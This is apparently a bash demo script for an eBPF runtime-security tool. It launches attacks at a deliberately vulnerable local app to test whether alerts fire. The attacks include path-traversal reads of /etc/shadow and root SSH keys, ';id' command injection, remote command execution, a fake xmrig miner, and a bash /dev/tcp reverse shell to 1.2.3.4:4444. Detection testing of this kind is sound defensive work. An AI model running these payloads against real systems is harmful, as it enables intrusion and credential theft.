#!/usr/bin/env bash
# =============================================================
# ebpf-guard demo attack script
# Runs attacks against the vulnerable target app and checks
# that ebpf-guard fires alerts via its HTTP API.
#
# Usage:
#   ./attack.sh [TARGET_HOST] [EBPF_GUARD_HOST] [ADMIN_TOKEN]
#
# Defaults:
#   TARGET_HOST      = localhost:8080
#   EBPF_GUARD_HOST  = localhost:9090
#   ADMIN_TOKEN      = read from /run/ebpf-guard/token
# =============================================================

TARGET="${1:-localhost:8080}"
GUARD="${2:-localhost:9090}"
TOKEN="${3:-}"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; BLD='\033[1m'; RST='\033[0m'

if [[ -z "$TOKEN" && -f /run/ebpf-guard/token ]]; then
    TOKEN=$(awk -F= '/admin/{print $2}' /run/ebpf-guard/token 2>/dev/null | head -1)
fi

sep() { echo -e "\n${BLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }
ok()  { echo -e "  ${GRN}[+]${RST} $*"; }
warn(){ echo -e "  ${YLW}[!]${RST} $*"; }
atk() { echo -e "  ${RED}[ATTACK]${RST} $*"; }

wait_target() {
    echo -n "Waiting for target app on $TARGET ..."
    for i in $(seq 1 20); do
        curl -sf "http://$TARGET/health" >/dev/null 2>&1 && echo " ready" && return
        sleep 1; echo -n "."
    done
    echo " TIMEOUT"; exit 1
}

alerts_count() {
    curl -sf -H "Authorization: Bearer $TOKEN" "http://$GUARD/alerts" 2>/dev/null \
        | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else d.get('total',0))" 2>/dev/null || echo "?"
}

sep
echo -e "${BLD}ebpf-guard Demo Attack Suite${RST}"
echo "  Target :  http://$TARGET"
echo "  Guard  :  http://$GUARD"
[[ -n "$TOKEN" ]] && echo "  Token  :  ${TOKEN:0:16}..." || warn "No token — /alerts check will be skipped"
sep

wait_target
ALERTS_BEFORE=$(alerts_count)
echo "Alerts before attacks: $ALERTS_BEFORE"

sep
echo -e "${BLD}[1] Reconnaissance — read /etc/passwd${RST}"
atk "GET /read?file=/etc/passwd"
RES=$(curl -sf "http://$TARGET/read?file=/etc/passwd")
echo "$RES" | grep -q "root:" && ok "Got /etc/passwd (first: $(echo "$RES" | head -1))" || warn "Response: $RES"

sep
echo -e "${BLD}[2] Sensitive file access — /etc/shadow${RST}"
atk "GET /read?file=/etc/shadow"
RES=$(curl -sf "http://$TARGET/read?file=/etc/shadow" 2>&1)
ok "Response: ${RES:0:80}"

sep
echo -e "${BLD}[3] Command injection via ping — ;id${RST}"
atk "GET /ping?host=127.0.0.1;id"
RES=$(curl -sf "http://$TARGET/ping?host=127.0.0.1%3Bid")
ok "Response: $(echo "$RES" | tr '\n' ' ' | cut -c1-120)"

sep
echo -e "${BLD}[4] Direct RCE — cat /etc/passwd${RST}"
atk "GET /exec?cmd=cat+/etc/passwd"
RES=$(curl -sf "http://$TARGET/exec?cmd=cat+/etc/passwd")
echo "$RES" | grep -q "root:" && ok "RCE successful — read /etc/passwd via exec endpoint"

sep
echo -e "${BLD}[5] Crypto-miner simulation — xmrig process name${RST}"
atk "GET /exec?cmd=cp+/bin/sleep+/tmp/xmrig"
curl -sf "http://$TARGET/exec?cmd=cp+/bin/sleep+/tmp/xmrig" >/dev/null
atk "GET /exec?cmd=/tmp/xmrig+1"
curl -sf "http://$TARGET/exec?cmd=/tmp/xmrig+1" >/dev/null
ok "Executed /tmp/xmrig (sleep wrapper)"
rm -f /tmp/xmrig 2>/dev/null

sep
echo -e "${BLD}[6] SSH key exfiltration${RST}"
atk "GET /read?file=/root/.ssh/id_rsa"
RES=$(curl -sf "http://$TARGET/read?file=/root/.ssh/id_rsa" 2>&1)
ok "Response: ${RES:0:80}"

sep
echo -e "${BLD}[7] Container escape probe — /proc/1/cgroup${RST}"
atk "GET /read?file=/proc/1/cgroup"
RES=$(curl -sf "http://$TARGET/read?file=/proc/1/cgroup")
ok "Response: $(echo "$RES" | head -3 | tr '\n' ' ')"

sep
echo -e "${BLD}[8] Environment dump — secrets in env${RST}"
atk "GET /env"
ok "Env lines: $(curl -sf "http://$TARGET/env" | wc -l)"

sep
echo -e "${BLD}[9] Reverse shell attempt (will fail — syscalls still logged)${RST}"
atk "GET /exec?cmd=bash+-i+>&+/dev/tcp/1.2.3.4/4444+0>&1"
curl -sf --max-time 2 "http://$TARGET/exec?cmd=bash+-i+>%26+/dev/tcp/1.2.3.4/4444+0>%261" >/dev/null 2>&1 || true
ok "Attempted reverse shell to 1.2.3.4:4444 (expected to fail)"

sep
echo -e "${BLD}[10] Canary file access (honeypot trigger)${RST}"
atk "GET /read?file=/etc/shadow.canary"
curl -sf "http://$TARGET/read?file=/etc/shadow.canary" >/dev/null 2>&1 || true
ok "Touched /etc/shadow.canary"

sep
echo ""
echo -e "${BLD}Attack suite complete. Checking ebpf-guard alerts...${RST}"
sleep 2

ALERTS_AFTER=$(alerts_count)
echo ""
echo "  Alerts before : $ALERTS_BEFORE"
echo "  Alerts after  : $ALERTS_AFTER"
echo ""

if [[ -n "$TOKEN" ]]; then
    echo -e "${BLD}Recent alerts:${RST}"
    curl -sf -H "Authorization: Bearer $TOKEN" "http://$GUARD/alerts" 2>/dev/null \
        | python3 -c "
import sys, json
alerts = json.load(sys.stdin)
if isinstance(alerts, dict):
    alerts = alerts.get('alerts', [])
for a in alerts[-10:]:
    sev = a.get('severity','?').upper()
    rule = a.get('rule_id', a.get('id','?'))
    msg = a.get('message', a.get('description',''))[:80]
    print(f'  [{sev}] {rule}: {msg}')
" 2>/dev/null || echo "  (check manually: curl -H 'Authorization: Bearer \$TOKEN' http://$GUARD/alerts)"
fi

echo ""
echo -e "${GRN}${BLD}Done.${RST} Full alerts: curl -H 'Authorization: Bearer \$TOKEN' http://$GUARD/alerts | python3 -m json.tool"
